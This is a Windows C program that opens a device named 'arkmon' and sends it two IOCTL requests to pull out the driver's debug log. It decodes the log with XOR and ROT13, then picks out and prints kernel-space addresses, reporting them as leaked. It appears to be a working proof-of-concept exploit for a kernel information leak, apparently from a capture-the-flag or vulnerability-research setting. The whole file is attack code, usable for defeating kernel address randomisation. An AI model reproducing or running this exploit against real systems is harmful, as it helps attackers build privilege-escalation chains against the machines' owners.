#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

static char rot13(char c) {
    if (c >= 'A' && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    if (c >= 'a' && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    return c;
}

int main(void) {

    HANDLE hDev = CreateFileA("\\\\.\\arkmon", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) {
        printf("cannot open device: %lu\n", GetLastError());
        return 1;
    }

    uint32_t info[2] = {0};
    DWORD br = 0;
    uint8_t dummy[8] = {0};
    DeviceIoControl(hDev, 0x223e80, dummy, 8, info, 8, &br, NULL);

    DWORD alloc_size = info[1] > 0 ? info[1] + 0x1000 : 0x10000;
    uint8_t *buf = (uint8_t *)calloc(1, alloc_size);
    if (!buf) return 1;

    br = 0;
    BOOL ok = DeviceIoControl(hDev, 0x223e84, NULL, 0, buf, alloc_size, &br, NULL);
    if (!ok || br == 0)
        ok = DeviceIoControl(hDev, 0x223e84, dummy, 8, buf, alloc_size, &br, NULL);
    if (!ok || br == 0) {
        printf("failed to read debug log %lu\n", GetLastError());
        free(buf); CloseHandle(hDev);
        return 1;
    }

    char *text = (char *)malloc(br + 1);
    for (DWORD i = 0; i < br; i++)
        text[i] = rot13((char)(buf[i] ^ 0xCC));
    text[br] = '\0';
    free(buf);

    printf("=== Decrypted Kernel Debug Log ===\n\n");
    for (DWORD i = 0; i < br; i++) {
        char c = text[i];
        if (c >= 32 && c < 127) putchar(c);
        else if (c == '\n' || c == '\r') putchar(c);
    }
    printf("\n\n=== Leaked Kernel Addresses ===\n\n");
    int count = 0;
    char *p = text;
    while ((p = strstr(p, "0x")) != NULL) {
        char hex[20] = {0};
        int j;
        for (j = 0; j < 18 && p[j]; j++) {
            char c = p[j];
            if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
                (c >= 'A' && c <= 'F') || c == 'x' || c == 'X')
                hex[j] = c;
            else break;
        }
        hex[j] = '\0';
        if (j >= 6) {
            uint64_t val = strtoull(hex, NULL, 16);
            if (val > 0xFFFF800000000000ULL && val < 0xFFFFFFFFFFFFFFF0ULL) {
                printf("  %s\n", hex);
                count++;
            }
        }
        p += (j > 2 ? j : 2);
    }
    printf("\n%d kernel address(es) leaked\n", count);
    free(text);
    CloseHandle(hDev);
    return 0;
}
